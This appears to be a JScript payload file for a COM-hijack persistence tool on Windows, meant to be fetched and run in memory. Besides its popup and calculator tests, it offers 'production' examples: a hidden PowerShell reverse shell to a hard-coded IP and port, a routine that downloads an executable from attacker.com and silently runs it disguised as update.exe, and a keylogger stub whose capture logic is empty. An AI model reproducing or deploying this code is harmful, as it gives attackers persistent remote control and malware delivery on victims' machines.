// ═══════════════════════════════════════════════════════════════════════
//  Test Payload - JavaScript Popup
//  This file is fetched from server and executed in-memory
//  Use this to test the COM_HIJACK.ps1 persistence mechanism
// ═══════════════════════════════════════════════════════════════════════

// Test popup - shows the persistence is working
// This will display a message box when executed

// Method 1: Using WScript.Shell (COM)
var shell = new ActiveXObject("WScript.Shell");
shell.Popup("COM Hijack Persistence Test Successful!\n\nThe JavaScript payload executed in-memory.", 0, "System Message", 64);

// Method 2: Alternative - Silent execution (for production)
// Uncomment below for silent mode:
// shell.Run("calc.exe", 0, false);

// ═══════════════════════════════════════════════════════════════════════
//  Other test payloads you can use:
// ═══════════════════════════════════════════════════════════════════════

// Launch Calculator (visible test)
var shell2 = new ActiveXObject("WScript.Shell");
shell2.Run("calc.exe", 1, false);

// ═══════════════════════════════════════════════════════════════════════
//  Real payload examples (for production use):
// ═══════════════════════════════════════════════════════════════════════

/*
// Reverse Shell Example:
var shell = new ActiveXObject("WScript.Shell");
shell.Run("cmd /c powershell -nop -w hidden -c \"$client = New-Object System.Net.Sockets.TCPClient('192.168.1.100',4444);$stream = $client.GetStream();[byte[]]$buffer = 0..65535|%%{0};while(($n = $stream.Read($buffer,0,$buffer.Length)) -gt 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0,$n);$sendback = (iex $data 2>&1 | Out-String );$sendbyte = ([text.encoding]::ASCII.GetBytes($sendback));$stream.Write($sendbyte,0,$sendbyte.Length)};$client.Close()\"", 0, false);
*/

/*
// Download and Execute:
var wsh = new ActiveXObject("WScript.Shell");
var fso = new ActiveXObject("Scripting.FileSystemObject");
var temp = fso.GetSpecialFolder(2) + "\\update.exe";
var http = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
http.open("GET", "http://attacker.com/payload.exe", false);
http.send();
var stream = new ActiveXObject("ADODB.Stream");
stream.Type = 1;
stream.Open();
stream.Write(http.responseBody);
stream.SaveToFile(temp, 2);
wsh.Run(temp, 0, false);
*/

/*
// Keylogger:
var log = "";
var shell = new ActiveXObject("WScript.Shell");
while (true) {
    for (var i = 8; i <= 255; i++) {
        if (shell.AppActivate("Notepad")) {
            // Simple key capture logic
        }
    }
    WScript.Sleep(10);
}
*/

// ═══════════════════════════════════════════════════════════════════════
